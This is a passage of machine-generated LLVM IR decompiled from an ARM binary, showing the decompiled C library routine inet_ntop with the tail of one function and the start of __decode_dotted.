  %v3_18550 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_18550, i32* %r0.global-to-local, align 4
  %v2_18554 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_18554, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_18550, %v2_18554
  br i1 %tmp, label %dec_label_pc_18560, label %dec_label_pc_18574

dec_label_pc_18560:                               ; preds = %dec_label_pc_18540
  %v0_18560 = call i32 @__GI___errno_location()
  store i32 %v0_18560, i32* %r0.global-to-local, align 4
  %v0_18568 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18568, i32* %r2.global-to-local, align 4
  %v2_1856c = inttoptr i32 %v0_18560 to i32*
  store i32 28, i32* %v2_1856c, align 4
  %v0_18584.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18584

dec_label_pc_18574:                               ; preds = %dec_label_pc_18540
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_18544, i32* @r1, align 4
  %v2_1857c = inttoptr i32 %arg2 to i8*
  %v3_1857c = call i32 @strcpy(i8* %v2_1857c, i32 %v2_18544)
  store i32 %v3_1857c, i32* %r0.global-to-local, align 4
  store i32 %v3_1857c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18584

dec_label_pc_18584:                               ; preds = %dec_label_pc_18560, %dec_label_pc_18574
  %v0_18584 = phi i32 [ %v0_18584.pre, %dec_label_pc_18560 ], [ %v3_1857c, %dec_label_pc_18574 ]
  store i32 %v0_18584, i32* %r0.global-to-local, align 4
  ret i32 %v0_18584

; uselistorder directives
  uselistorder i32 %v0_18584, { 1, 0 }
  uselistorder i32 %v2_18544, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18538, { 0, 2, 1 }
  uselistorder i32 %v1_18478, { 1, 0 }
  uselistorder i32 %v1_184c0, { 1, 0, 2 }
  uselistorder i32 %v2_18528, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 2, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18584, { 1, 0 }
  uselistorder label %dec_label_pc_18528, { 1, 0 }
  uselistorder label %dec_label_pc_184f4, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_18594 = load i32, i32* @r5, align 4
  %v7_185a0 = icmp eq i32 %arg1, 2
  store i1 %v7_185a0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_185a0, label %dec_label_pc_185c4, label %dec_label_pc_185b8

dec_label_pc_185b8:                               ; preds = %entry
  %v7_185b8 = icmp eq i32 %arg1, 10
  store i1 %v7_185b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_185b8, label %dec_label_pc_185d8, label %dec_label_pc_187ec

dec_label_pc_185c4:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_185d0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_187e4

dec_label_pc_185d8:                               ; preds = %dec_label_pc_185b8
  %v2_185d8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_185d8, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_185e4 = bitcast i32* %stack_var_-72 to i8*
  %v3_185e4 = call i32 @__GI_memset(i8* %v2_185e4, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_18608 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_185ec

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185ec.dec_label_pc_185ec_crit_edge, %dec_label_pc_185d8
  %v0_18604 = phi i32 [ %v0_185ec.pre, %dec_label_pc_185ec.dec_label_pc_185ec_crit_edge ], [ 0, %dec_label_pc_185d8 ]
  %v1_185ec = load i32, i32* @r8, align 4
  %v2_185ec = add i32 %v1_185ec, %v0_18604
  %v3_185f0 = inttoptr i32 %v2_185ec to i8*
  %v4_185f0 = load i8, i8* %v3_185f0, align 1
  %v6_185f0 = zext i8 %v4_185f0 to i32
  %v1_185f4 = add i32 %v2_185ec, 1
  %v2_185f4 = inttoptr i32 %v1_185f4 to i8*
  %v3_185f4 = load i8, i8* %v2_185f4, align 1
  %v4_185f4 = zext i8 %v3_185f4 to i32
  %tmp74 = icmp slt i32 %v0_18604, 0
  %v4_185f8 = zext i1 %tmp74 to i32
  %v5_185f8 = add i32 %v4_185f8, %v0_18604
  %v4_185fc = mul nuw nsw i32 %v6_185f0, 256
  %v5_185fc = or i32 %v4_185f4, %v4_185fc
  store i32 %v5_185fc, i32* %r2.global-to-local, align 4
  %v3_18600 = sdiv i32 %v5_185f8, 2
  %v1_18604 = add i32 %v0_18604, 2
  store i32 %v1_18604, i32* %r0.global-to-local, align 4
  %v4_1860c = mul i32 %v3_18600, 4
  %v5_1860c = add i32 %v4_1860c, %v2_18608
  %v7_18610 = icmp eq i32 %v1_18604, 15
  store i1 %v7_18610, i1* %cpsr_z.global-to-local, align 1
  %v2_18614 = add i32 %v5_1860c, -32
  %v3_18614 = inttoptr i32 %v2_18614 to i32*
  store i32 %v5_185fc, i32* %v3_18614, align 4
  %v7_18618 = icmp sgt i32 %v1_18604, 15
  br i1 %v7_18618, label %dec_label_pc_1861c, label %dec_label_pc_185ec.dec_label_pc_185ec_crit_edge

dec_label_pc_185ec.dec_label_pc_185ec_crit_edge:  ; preds = %dec_label_pc_185ec
  %v0_185ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_185ec

dec_label_pc_1861c:                               ; preds = %dec_label_pc_185ec
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18634

dec_label_pc_18634:                               ; preds = %dec_label_pc_1861c, %dec_label_pc_18680
  %v0_18674 = phi i32 [ -1, %dec_label_pc_1861c ], [ %v0_186a8, %dec_label_pc_18680 ]
  %v0_18664 = phi i32 [ -1, %dec_label_pc_1861c ], [ %v0_18694, %dec_label_pc_18680 ]
  %v0_18648 = phi i32 [ -1, %dec_label_pc_1861c ], [ %v0_186487, %dec_label_pc_18680 ]
  %v0_18680 = phi i32 [ 0, %dec_label_pc_1861c ], [ %v1_18680, %dec_label_pc_18680 ]
  %v4_18638 = mul nuw nsw i32 %v0_18680, 4
  %v5_18638 = add i32 %v4_18638, %v2_18608
  %v1_1863c = add i32 %v5_18638, -32
  %v2_1863c = inttoptr i32 %v1_1863c to i32*
  %v3_1863c = load i32, i32* %v2_1863c, align 4
  %v2_18640 = icmp eq i32 %v3_1863c, 0
  %v7_18648 = icmp eq i32 %v0_18648, -1
  br i1 %v2_18640, label %dec_label_pc_18648, label %dec_label_pc_1865c

dec_label_pc_18648:                               ; preds = %dec_label_pc_18634
  br i1 %v7_18648, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18648
  store i32 %v0_18680, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_18680

.thread:                                          ; preds = %dec_label_pc_18648
  %v1_18654.pre = load i32, i32* @r4, align 4
  %v2_18654 = add i32 %v1_18654.pre, 1
  store i32 %v2_18654, i32* @r4, align 4
  br label %dec_label_pc_18680

dec_label_pc_1865c:                               ; preds = %dec_label_pc_18634
  br i1 %v7_18648, label %dec_label_pc_18680, label %dec_label_pc_18664

dec_label_pc_18664:                               ; preds = %dec_label_pc_1865c
  %v7_18664 = icmp eq i32 %v0_18664, -1
  %v0_18678.pre = load i32, i32* @r4, align 4
  %v1_1866c = load i32, i32* @r7, align 4
  %v7_18670 = icmp sgt i32 %v0_18678.pre, %v1_1866c
  %or.cond = or i1 %v7_18664, %v7_18670
  br i1 %or.cond, label %dec_label_pc_18674, label %dec_label_pc_1867c

dec_label_pc_18674:                               ; preds = %dec_label_pc_18664
  store i32 %v0_18674, i32* @r6, align 4
  store i32 %v0_18678.pre, i32* @r7, align 4
  br label %dec_label_pc_1867c

dec_label_pc_1867c:                               ; preds = %dec_label_pc_18664, %dec_label_pc_18674
  %v0_1866412 = phi i32 [ %v0_18674, %dec_label_pc_18674 ], [ %v0_18664, %dec_label_pc_18664 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18680

dec_label_pc_18680:                               ; preds = %bb, %.thread, %dec_label_pc_1865c, %dec_label_pc_1867c
  %v0_186a8 = phi i32 [ %v0_18674, %.thread ], [ %v0_18680, %bb ], [ %v0_18674, %dec_label_pc_1865c ], [ -1, %dec_label_pc_1867c ]
  %v0_186487 = phi i32 [ %v0_18648, %.thread ], [ %v0_18680, %bb ], [ -1, %dec_label_pc_1865c ], [ -1, %dec_label_pc_1867c ]
  %v0_18694 = phi i32 [ %v0_18664, %.thread ], [ %v0_18664, %bb ], [ %v0_18664, %dec_label_pc_1865c ], [ %v0_1866412, %dec_label_pc_1867c ]
  %v1_18680 = add nuw nsw i32 %v0_18680, 1
  %v7_18688 = icmp slt i32 %v1_18680, 8
  br i1 %v7_18688, label %dec_label_pc_18634, label %dec_label_pc_1868c

dec_label_pc_1868c:                               ; preds = %dec_label_pc_18680
  %v7_1868c = icmp eq i32 %v0_186a8, -1
  store i1 %v7_1868c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1868c, label %dec_label_pc_1868c.dec_label_pc_186ac_crit_edge, label %dec_label_pc_18694

dec_label_pc_1868c.dec_label_pc_186ac_crit_edge:  ; preds = %dec_label_pc_1868c
  %v1_186d0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_186ac

dec_label_pc_18694:                               ; preds = %dec_label_pc_1868c
  %v7_18694 = icmp eq i32 %v0_18694, -1
  store i1 %v7_18694, i1* %cpsr_z.global-to-local, align 1
  %v0_186a4.pre = load i32, i32* @r4, align 4
  br i1 %v7_18694, label %dec_label_pc_186a4, label %dec_label_pc_1869c

dec_label_pc_1869c:                               ; preds = %dec_label_pc_18694
  %v1_1869c = load i32, i32* @r7, align 4
  %v9_1869c = icmp eq i32 %v0_186a4.pre, %v1_1869c
  store i1 %v9_1869c, i1* %cpsr_z.global-to-local, align 1
  %v7_186a0 = icmp sgt i32 %v0_186a4.pre, %v1_1869c
  br i1 %v7_186a0, label %dec_label_pc_186a4, label %dec_label_pc_186ac

dec_label_pc_186a4:                               ; preds = %dec_label_pc_18694, %dec_label_pc_1869c
  store i32 %v0_186a4.pre, i32* @r7, align 4
  store i32 %v0_186a8, i32* @r6, align 4
  br label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %dec_label_pc_1868c.dec_label_pc_186ac_crit_edge, %dec_label_pc_1869c, %dec_label_pc_186a4
  %v1_186d0.pre = phi i32 [ %v1_1869c, %dec_label_pc_1869c ], [ %v1_186d0.pre.pre, %dec_label_pc_1868c.dec_label_pc_186ac_crit_edge ], [ %v0_186a4.pre, %dec_label_pc_186a4 ]
  %v0_186ac = phi i32 [ %v0_18694, %dec_label_pc_1869c ], [ %v0_18694, %dec_label_pc_1868c.dec_label_pc_186ac_crit_edge ], [ %v0_186a8, %dec_label_pc_186a4 ]
  %v7_186ac = icmp eq i32 %v0_186ac, -1
  store i1 %v7_186ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_186ac, label %dec_label_pc_186ac._crit_edge, label %dec_label_pc_186b4

dec_label_pc_186b4:                               ; preds = %dec_label_pc_186ac
  %v7_186b4 = icmp eq i32 %v1_186d0.pre, 1
  store i1 %v7_186b4, i1* %cpsr_z.global-to-local, align 1
  %v7_186b8 = icmp slt i32 %v1_186d0.pre, 2
  br i1 %v7_186b8, label %bb54, label %dec_label_pc_186ac._crit_edge

bb54:                                             ; preds = %dec_label_pc_186b4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_186ac._crit_edge

dec_label_pc_186ac._crit_edge:                    ; preds = %dec_label_pc_186ac, %dec_label_pc_186b4, %bb54
  %v0_186d0 = phi i32 [ %v0_186ac, %dec_label_pc_186b4 ], [ -1, %bb54 ], [ %v0_186ac, %dec_label_pc_186ac ]
  %v2_186c0 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_186c0, i32* @r4, align 4
  %v0_186c4 = load i32, i32* @r5, align 4
  %v2_186c4 = add i32 %v0_186c4, -34144
  store i32 %v2_186c4, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_186d0 = add i32 %v0_186d0, %v1_186d0.pre
  store i32 %v2_186d0, i32* @sl, align 4
  %v9_18730 = icmp eq i32 %tmp, 65535
  %v7_186d868 = icmp eq i32 %v0_186d0, -1
  store i1 %v7_186d868, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_186d8

dec_label_pc_186d8:                               ; preds = %dec_label_pc_186ac._crit_edge, %dec_label_pc_18788
  %v7_186d872 = phi i1 [ %v7_186d868, %dec_label_pc_186ac._crit_edge ], [ %v7_186d8, %dec_label_pc_18788 ]
  %v0_1870471 = phi i32 [ 0, %dec_label_pc_186ac._crit_edge ], [ %v1_18788, %dec_label_pc_18788 ]
  %v1_186f070 = phi i32 [ %v0_186d0, %dec_label_pc_186ac._crit_edge ], [ %v0_186d8.pre, %dec_label_pc_18788 ]
  %v2_1870869 = phi i32 [ %v2_186c0, %dec_label_pc_186ac._crit_edge ], [ %v3_186f429, %dec_label_pc_18788 ]
  br i1 %v7_186d872, label %dec_label_pc_186fc, label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %dec_label_pc_186d8
  %v9_186e0 = icmp eq i32 %v0_1870471, %v1_186f070
  store i1 %v9_186e0, i1* %cpsr_z.global-to-local, align 1
  %v5_186e4 = icmp slt i32 %v0_1870471, %v1_186f070
  br i1 %v5_186e4, label %dec_label_pc_186fc, label %dec_label_pc_186e8

dec_label_pc_186e8:                               ; preds = %dec_label_pc_186e0
  %v1_186e8 = load i32, i32* @sl, align 4
  %v9_186e8 = icmp eq i32 %v0_1870471, %v1_186e8
  store i1 %v9_186e8, i1* %cpsr_z.global-to-local, align 1
  %v6_186ec = icmp slt i32 %v0_1870471, %v1_186e8
  br i1 %v6_186ec, label %dec_label_pc_186f0, label %dec_label_pc_186fc

dec_label_pc_186f0:                               ; preds = %dec_label_pc_186e8
  store i1 %v9_186e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_186e0, label %bb56, label %dec_label_pc_18788

bb56:                                             ; preds = %dec_label_pc_186f0
  %v1_186f4 = load i32, i32* @sb, align 4
  %v2_186f4 = trunc i32 %v1_186f4 to i8
  %v4_186f4 = inttoptr i32 %v2_1870869 to i8*
  store i8 %v2_186f4, i8* %v4_186f4, align 1
  %v5_186f4 = load i32, i32* @r4, align 4
  %v6_186f4 = add i32 %v5_186f4, 1
  store i32 %v6_186f4, i32* @r4, align 4
  br label %dec_label_pc_18788

dec_label_pc_186fc:                               ; preds = %dec_label_pc_186e8, %dec_label_pc_186e0, %dec_label_pc_186d8
  %v2_186fc = icmp eq i32 %v0_1870471, 0
  store i1 %v2_186fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186fc, label %dec_label_pc_1876c, label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %dec_label_pc_186fc
  %v7_18704 = icmp eq i32 %v0_1870471, 6
  store i1 %v7_18704, i1* %cpsr_z.global-to-local, align 1
  %v0_18708 = load i32, i32* @sb, align 4
  %v1_18708 = trunc i32 %v0_18708 to i8
  %v3_18708 = inttoptr i32 %v2_1870869 to i8*
  store i8 %v1_18708, i8* %v3_18708, align 1
  %v4_18708 = load i32, i32* @r4, align 4
  %v5_18708 = add i32 %v4_18708, 1
  store i32 %v5_18708, i32* @r4, align 4
  %v0_1870c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1870c, label %dec_label_pc_18710, label %dec_label_pc_1876c

dec_label_pc_18710:                               ; preds = %dec_label_pc_18704
  %v0_18710 = load i32, i32* @r6, align 4
  %v2_18710 = icmp eq i32 %v0_18710, 0
  store i1 %v2_18710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18710, label %dec_label_pc_18718, label %dec_label_pc_1876c

dec_label_pc_18718:                               ; preds = %dec_label_pc_18710
  %v0_18718 = load i32, i32* @r7, align 4
  %v7_18718 = icmp eq i32 %v0_18718, 6
  store i1 %v7_18718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18718, label %dec_label_pc_18738, label %dec_label_pc_18720

dec_label_pc_18720:                               ; preds = %dec_label_pc_18718
  %v7_18720 = icmp eq i32 %v0_18718, 5
  store i1 %v7_18720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18720, label %dec_label_pc_18728, label %dec_label_pc_1876c

dec_label_pc_18728:                               ; preds = %dec_label_pc_18720
  store i1 %v9_18730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18730, label %dec_label_pc_18738, label %dec_label_pc_1876c

dec_label_pc_18738:                               ; preds = %dec_label_pc_18728, %dec_label_pc_18718
  %v2_1873c = sub i32 %v2_18608, %v5_18708
  %v1_18740 = add i32 %v2_1873c, -32
  store i32 %v1_18740, i32* %r2.global-to-local, align 4
  %v0_18744 = load i32, i32* @r8, align 4
  %v1_18744 = add i32 %v0_18744, 12
  store i32 %v1_18744, i32* %r0.global-to-local, align 4
  %v3_1874c = call i32 @inet_ntop4(i32 %v1_18744, i32 %v5_18708, i32 %v1_18740)
  store i32 %v3_1874c, i32* %r0.global-to-local, align 4
  %v2_18750 = icmp eq i32 %v3_1874c, 0
  store i1 %v2_18750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18750, label %bb57, label %dec_label_pc_1875c

bb57:                                             ; preds = %dec_label_pc_18738
  %v1_18754 = load i32, i32* @r6, align 4
  store i32 %v1_18754, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187fc

dec_label_pc_1875c:                               ; preds = %dec_label_pc_18738
  %v0_1875c = load i32, i32* @r4, align 4
  %v1_1875c = inttoptr i32 %v0_1875c to i8*
  store i32 %v0_1875c, i32* %r0.global-to-local, align 4
  %v3_18760 = call i32 @strlen(i8* %v1_1875c)
  store i32 %v3_18760, i32* %r0.global-to-local, align 4
  %v0_18764 = load i32, i32* @r4, align 4
  %v2_18764 = add i32 %v0_18764, %v3_18760
  store i32 %v2_18764, i32* @r4, align 4
  %v0_1879c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1879c

dec_label_pc_1876c:                               ; preds = %dec_label_pc_18728, %dec_label_pc_18720, %dec_label_pc_18710, %dec_label_pc_18704, %dec_label_pc_186fc
  %v0_18774 = phi i32 [ %v5_18708, %dec_label_pc_18728 ], [ %v5_18708, %dec_label_pc_18720 ], [ %v5_18708, %dec_label_pc_18710 ], [ %v5_18708, %dec_label_pc_18704 ], [ %v2_1870869, %dec_label_pc_186fc ]
  store i32 %v2_18608, i32* @lr, align 4
  %v1_18770 = load i32, i32* @r5, align 4
  %v4_18770 = mul i32 %v1_18770, 4
  %v5_18770 = add i32 %v4_18770, %v2_18608
  store i32 %v0_18774, i32* @r0, align 4
  %v1_18778 = add i32 %v5_18770, -32
  %v2_18778 = inttoptr i32 %v1_18778 to i32*
  %v3_18778 = load i32, i32* %v2_18778, align 4
  store i32 %v3_18778, i32* %r2.global-to-local, align 4
  %v0_1877c = load i32, i32* @fp, align 4
  %v7_18780 = call i32 @sprintf(i32 %v0_18774, i32 %v0_1877c, i32 %v3_18778, i32 %v5_18770, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_18780, i32* %r0.global-to-local, align 4
  %v0_18784 = load i32, i32* @r4, align 4
  %v2_18784 = add i32 %v0_18784, %v7_18780
  store i32 %v2_18784, i32* @r4, align 4
  br label %dec_label_pc_18788

dec_label_pc_18788:                               ; preds = %bb56, %dec_label_pc_186f0, %dec_label_pc_1876c
  %v3_186f429 = phi i32 [ %v6_186f4, %bb56 ], [ %v2_1870869, %dec_label_pc_186f0 ], [ %v2_18784, %dec_label_pc_1876c ]
  %v0_18788 = load i32, i32* @r5, align 4
  %v1_18788 = add i32 %v0_18788, 1
  store i32 %v1_18788, i32* @r5, align 4
  %v0_186d8.pre = load i32, i32* @r6, align 4
  %v7_18790 = icmp slt i32 %v1_18788, 8
  %v7_186d8 = icmp eq i32 %v0_186d8.pre, -1
  store i1 %v7_186d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18790, label %dec_label_pc_186d8, label %dec_label_pc_18794

dec_label_pc_18794:                               ; preds = %dec_label_pc_18788
  br i1 %v7_186d8, label %.thread2, label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18794, %dec_label_pc_1875c
  %v3_187a8 = phi i32 [ %v3_186f429, %dec_label_pc_18794 ], [ %v2_18764, %dec_label_pc_1875c ]
  %v0_1879c = phi i32 [ %v0_186d8.pre, %dec_label_pc_18794 ], [ %v0_1879c.pre, %dec_label_pc_1875c ]
  %v1_1879c = load i32, i32* @r7, align 4
  %v2_1879c = add i32 %v1_1879c, %v0_1879c
  %v7_187a0 = icmp eq i32 %v2_1879c, 8
  store i1 %v7_187a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_187a0, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1879c
  %v4_187a8 = inttoptr i32 %v3_187a8 to i8*
  store i8 58, i8* %v4_187a8, align 1
  %v5_187a8 = load i32, i32* @r4, align 4
  %v6_187a8 = add i32 %v5_187a8, 1
  store i32 %v6_187a8, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1879c, %dec_label_pc_18794, %bb58
  %v2_187b0 = phi i32 [ %v3_187a8, %dec_label_pc_1879c ], [ %v3_186f429, %dec_label_pc_18794 ], [ %v6_187a8, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_187b0 = inttoptr i32 %v2_187b0 to i8*
  store i8 0, i8* %v3_187b0, align 1
  %v4_187b0 = load i32, i32* @r4, align 4
  %v5_187b0 = add i32 %v4_187b0, 1
  store i32 %v2_186c0, i32* @r1, align 4
  %v2_187b8 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_187b8, i32* %r2.global-to-local, align 4
  %v2_187bc = sub i32 %v5_187b0, %v2_186c0
  %v9_187c0 = icmp eq i32 %v2_187bc, %v2_187b8
  store i1 %v9_187c0, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_187bc, %v2_187b8
  br i1 %tmp75, label %dec_label_pc_187c8, label %dec_label_pc_187dc

dec_label_pc_187c8:                               ; preds = %.thread2
  %v0_187c8 = call i32 @__GI___errno_location()
  store i32 %v0_187c8, i32* %r0.global-to-local, align 4
  %v0_187d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_187d0, i32* %r2.global-to-local, align 4
  %v2_187d4 = inttoptr i32 %v0_187c8 to i32*
  store i32 28, i32* %v2_187d4, align 4
  %v0_187fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187fc

dec_label_pc_187dc:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_187e0 = inttoptr i32 %arg3 to i8*
  %v3_187e0 = call i32 @strcpy(i8* %v2_187e0, i32 %v2_186c0)
  br label %dec_label_pc_187e4

dec_label_pc_187e4:                               ; preds = %dec_label_pc_185c4, %dec_label_pc_187dc
  %storemerge = phi i32 [ %v3_185d0, %dec_label_pc_185c4 ], [ %v3_187e0, %dec_label_pc_187dc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187fc

dec_label_pc_187ec:                               ; preds = %dec_label_pc_185b8
  %v0_187ec = call i32 @__GI___errno_location()
  store i32 %v0_187ec, i32* %r0.global-to-local, align 4
  %v2_187f4 = inttoptr i32 %v0_187ec to i32*
  store i32 97, i32* %v2_187f4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187fc

dec_label_pc_187fc:                               ; preds = %bb57, %dec_label_pc_187e4, %dec_label_pc_187c8, %dec_label_pc_187ec
  %v0_187fc = phi i32 [ %v1_18754, %bb57 ], [ %storemerge, %dec_label_pc_187e4 ], [ %v0_187fc.pre, %dec_label_pc_187c8 ], [ 0, %dec_label_pc_187ec ]
  store i32 %v0_187fc, i32* %r0.global-to-local, align 4
  store i32 %v6_18594, i32* %r5.global-to-local, align 4
  ret i32 %v0_187fc

; uselistorder directives
  uselistorder i32 %v0_187fc, { 1, 0 }
  uselistorder i1 %v7_186d8, { 2, 0, 1 }
  uselistorder i32 %v0_186d8.pre, { 1, 0, 2 }
  uselistorder i32 %v1_18788, { 0, 2, 1 }
  uselistorder i32 %v0_18774, { 1, 0 }
  uselistorder i32 %v0_1875c, { 1, 0 }
  uselistorder i32 %v5_18708, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_186e0, { 1, 0, 2 }
  uselistorder i32 %v2_1870869, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1870471, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_186d868, { 1, 0 }
  uselistorder i32 %v2_186c0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_186d0, { 1, 0, 2 }
  uselistorder i1 %v7_186ac, { 1, 0 }
  uselistorder i32 %v0_186ac, { 1, 2, 0 }
  uselistorder i32 %v1_186d0.pre, { 2, 0, 1 }
  uselistorder i32 %v0_186a4.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_18694, { 1, 0 }
  uselistorder i1 %v7_1868c, { 1, 0 }
  uselistorder i32 %v1_18680, { 1, 0 }
  uselistorder i32 %v0_18694, { 1, 2, 0, 3 }
  uselistorder i32 %v0_186a8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_18648, { 1, 0 }
  uselistorder i32 %v0_18680, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_18664, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_18674, { 3, 1, 0, 2 }
  uselistorder i32 %v1_18604, { 1, 0, 2 }
  uselistorder i32 %v2_185ec, { 1, 0 }
  uselistorder i32 %v0_18604, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18608, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 9, 1, 0, 8, 2, 3, 4, 7 }
  uselistorder i8 58, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_187fc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_187e4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18788, { 2, 0, 1 }
  uselistorder label %dec_label_pc_186d8, { 1, 0 }
  uselistorder label %dec_label_pc_186ac._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_186ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_186a4, { 1, 0 }
  uselistorder label %dec_label_pc_18680, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1867c, { 1, 0 }
  uselistorder label %dec_label_pc_18634, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
